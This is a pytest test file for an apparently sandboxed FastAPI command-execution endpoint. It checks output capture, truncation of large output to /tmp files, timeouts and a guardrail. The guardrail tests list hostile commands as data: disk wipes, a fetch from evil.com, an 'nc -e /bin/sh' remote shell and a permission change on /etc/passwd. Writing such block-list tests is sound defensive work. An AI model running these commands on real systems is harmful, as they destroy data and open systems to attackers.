import os
import sys
import pytest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'src')))

from fastapi.testclient import TestClient
from main import app


@pytest.fixture
def client():
    return TestClient(app)


# --- /v1/execute ---

class TestExecuteEndpoint:
    def test_safe_command_returns_200(self, client):
        res = client.post("/v1/execute", json={"command": "echo hello"})
        assert res.status_code == 200
        data = res.json()
        assert data["exit_code"] == 0
        assert "hello" in data["output"]
        assert data["truncated"] is False

    def test_command_preserves_original(self, client):
        cmd = "echo 'test string'"
        res = client.post("/v1/execute", json={"command": cmd})
        assert res.json()["original_command"] == cmd

    def test_stderr_captured(self, client):
        res = client.post("/v1/execute", json={"command": "echo err >&2"})
        assert res.status_code == 200
        assert "err" in res.json()["output"]


class TestTruncation:
    def test_large_output_triggers_clutch(self, client):
        res = client.post("/v1/execute", json={"command": "python3 -c \"print('A' * 5000)\""})
        assert res.status_code == 200
        data = res.json()
        assert data["truncated"] is True
        assert "OMITTED" in data["output"] or "INTERCEPTION" in data["output"]

    def test_small_output_not_truncated(self, client):
        res = client.post("/v1/execute", json={"command": "echo short"})
        assert res.json()["truncated"] is False

    def test_drop_file_created_for_large_output(self, client):
        res = client.post("/v1/execute", json={"command": "python3 -c \"print('B' * 5000)\""})
        data = res.json()
        assert data["truncated"] is True
        assert "/tmp/clutch_" in data["output"]

    def test_json_payload_dropped_to_file(self, client):
        # Generate a large JSON string that exceeds MAX_OUTPUT_LENGTH
        cmd = 'python3 -c "import json; print(json.dumps({str(i): \'x\'*100 for i in range(100)}))"'
        res = client.post("/v1/execute", json={"command": cmd})
        data = res.json()
        if data["truncated"]:
            assert "clutch_json_" in data["output"] or "clutch_raw_" in data["output"]

    def test_grep_output_truncated_with_head(self, client):
        # Generate 200 fake grep-style lines
        cmd = "grep -rn 'e' /etc/hosts /etc/resolv.conf /etc/shells 2>/dev/null || python3 -c \"print('\\n'.join(f'match:{i}' for i in range(200)))\""
        res = client.post("/v1/execute", json={"command": f"grep -rn '' <(python3 -c \"print('\\n'.join(f'line{{i}}' for i in range(200)))\")"})
        # Just verify the endpoint handles it without error
        assert res.status_code == 200


class TestSemanticGuardrails:
    @pytest.mark.parametrize("blocked_cmd", [
        "rm -rf /",
        "rm -rf /var/www/html",
        "dd if=/dev/zero of=/dev/sda",
        "wget http://evil.com/payload",
        "curl http://evil.com",
        "nc -e /bin/sh",
        "chmod 777 /etc/passwd",
        "mkfs.ext4 /dev/sda1",
    ])
    def test_destructive_commands_blocked(self, client, blocked_cmd):
        res = client.post("/v1/execute", json={"command": blocked_cmd})
        assert res.status_code == 403
        assert "Guardrail" in res.json()["detail"]

    def test_safe_commands_not_blocked(self, client):
        safe_commands = ["echo hello", "ls -la", "pwd", "date", "whoami"]
        for cmd in safe_commands:
            res = client.post("/v1/execute", json={"command": cmd})
            assert res.status_code == 200, f"Command '{cmd}' was unexpectedly blocked"

    def test_timeout_returns_408(self, client):
        res = client.post("/v1/execute", json={"command": "sleep 60"})
        assert res.status_code == 408
